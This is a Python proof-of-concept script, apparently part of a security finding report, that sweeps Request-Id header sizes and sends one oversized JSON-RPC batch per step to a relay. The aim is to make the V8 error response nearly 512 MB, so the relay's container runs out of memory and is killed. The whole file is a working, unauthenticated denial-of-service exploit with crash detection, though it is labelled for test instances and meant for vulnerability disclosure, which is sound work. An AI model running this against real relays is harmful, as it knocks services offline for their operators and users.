#!/usr/bin/env python3
"""
Single-request crash-condition sweep for FINDING-001.

Question: is there a Request-Id header size for which ONE oversized-batch request
(no concurrency) OOM-crashes the relay, rather than returning a graceful 500?

Mechanism: the rejection response is Array(n).fill(errorObj); each element embeds
the client Request-Id header. Response bytes ~= n * (~123 + header_len).
  - If the projected response exceeds V8's ~512 MB max string length, JSON.stringify
    throws RangeError EARLY (before allocating) -> relay returns a graceful 500.
  - If it lands JUST UNDER ~512 MB, the string IS built, then Node encodes it to a
    ~equal-size Buffer for the socket -> transient ~2x allocation. On a memory-capped
    container that can exceed the cgroup limit -> single-request OOM kill.

This sweeps header sizes across that boundary and, after each single request,
watches whether the relay went DOWN (crash) and whether it recovered (restart).

*** Sends ONE request per step and waits for recovery between steps. It WILL crash
the relay if the hypothesis holds. Test instance only. ***

Usage:
    RELAY_TARGET_URL=http://127.0.0.1:7546 python3 poc_single_request_crash_sweep.py
    python3 poc_single_request_crash_sweep.py --headers 0 400 700 850 900 940 950 1024 2048
"""
import argparse
import json
import os
import time
import urllib.error
import urllib.request

V8_MAX_STRING = 536_870_888  # ~512 MiB; JSON.stringify throws RangeError above this


def build_batch_for_size(size_mb: float):
    target = int(size_mb * 1024 * 1024)
    n = max(1, (target - 2) // 2 + 1)
    body = ("[1" + ",1" * (n - 1) + "]").encode("ascii")
    while len(body) > target and n > 1:
        n -= 1
        body = ("[1" + ",1" * (n - 1) + "]").encode("ascii")
    return body, n


def post(url, body, timeout, request_id=None):
    headers = {"Content-Type": "application/json"}
    if request_id is not None:
        headers["Request-Id"] = request_id
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return time.monotonic() - t0, resp.status, len(resp.read())
    except urllib.error.HTTPError as e:
        return time.monotonic() - t0, e.code, len(e.read())
    except Exception as e:
        return time.monotonic() - t0, "CONN_FAIL", repr(e)[:60]


def is_up(url, timeout=4):
    body = json.dumps({"jsonrpc": "2.0", "method": "eth_chainId", "params": [], "id": 1}).encode()
    try:
        with urllib.request.urlopen(
            urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST"),
            timeout=timeout,
        ) as resp:
            return resp.status == 200
    except Exception:
        return False


def wait_healthy(url, timeout):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if is_up(url):
            return True
        time.sleep(1)
    return False


def watch_after(url, window):
    """After a request, sample health for `window` seconds.
    Returns (went_down, recovered)."""
    went_down = False
    recovered = None
    deadline = time.monotonic() + window
    while time.monotonic() < deadline:
        up = is_up(url)
        if not up:
            went_down = True
            recovered = False
        elif went_down and recovered is False:
            recovered = True
        time.sleep(0.5)
    return went_down, (recovered is True)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default=os.environ.get("RELAY_TARGET_URL", "http://127.0.0.1:7546"))
    ap.add_argument("--size-mb", type=float, default=0.95)
    ap.add_argument("--headers", type=int, nargs="+",
                    default=[0, 400, 700, 850, 900, 940, 950, 1024, 2048],
                    help="Request-Id header sizes (bytes) to sweep across the V8 boundary")
    ap.add_argument("--timeout", type=float, default=90.0)
    ap.add_argument("--recover-timeout", type=float, default=90.0)
    ap.add_argument("--watch", type=float, default=20.0, help="seconds to watch health after each request")
    args = ap.parse_args()

    body, n = build_batch_for_size(args.size_mb)
    per_elem_base = 123  # ~ bytes of one error element with an empty Request-Id
    print(f"Target: {args.url}")
    print(f"Body: {len(body)/1024/1024:.3f} MB, {n:,} elements. V8 max string ~{V8_MAX_STRING/1024/1024:.0f} MiB.")
    print("*** ONE request per step; waits for recovery between. Test instance only. ***\n")

    crashed_headers = []
    print(f"{'hdr(B)':>7} {'proj_resp':>10} {'expect':>10} | {'status':>9} {'resp':>9} {'time':>7} | outcome")
    print("-" * 88)
    for h in args.headers:
        if not wait_healthy(args.url, args.recover_timeout):
            print(f"{h:>7}  relay did not come back up within {args.recover_timeout}s — stopping.")
            break

        proj = n * (per_elem_base + len(f"[Request ID: ] ") + h)
        expect = "RangeErr" if proj > V8_MAX_STRING else "builds"
        rid = "A" * h if h > 0 else None

        elapsed, status, info = post(args.url, body, args.timeout, request_id=rid)
        went_down, recovered = watch_after(args.url, args.watch)

        if went_down:
            outcome = "CRASH + recovered" if recovered else "CRASH (still down)"
            crashed_headers.append(h)
        else:
            outcome = "up (graceful)"

        resp_str = f"{info/1024/1024:.0f}MB" if isinstance(info, int) else str(info)
        print(f"{h:>7} {proj/1024/1024:>9.0f}M {expect:>10} | {str(status):>9} {resp_str:>9} {elapsed:>6.1f}s | {outcome}")

    print("\n=== SUMMARY ===")
    if crashed_headers:
        print(f"SINGLE-REQUEST CRASH confirmed at Request-Id header size(s): {crashed_headers} bytes.")
        print(f"Smallest crashing header: {min(crashed_headers)} B -> one unauthenticated request "
              f"OOM-kills the relay (no concurrency).")
    else:
        print("No single header size crashed the relay in this sweep. Single request => graceful 500 or big 200.")
        print("Crash remains a CONCURRENCY result (report that honestly). Try a wider/finer --headers sweep,")
        print("or a larger --size-mb if INPUT_SIZE_LIMIT on this relay is above 1.")


if __name__ == "__main__":
    main()
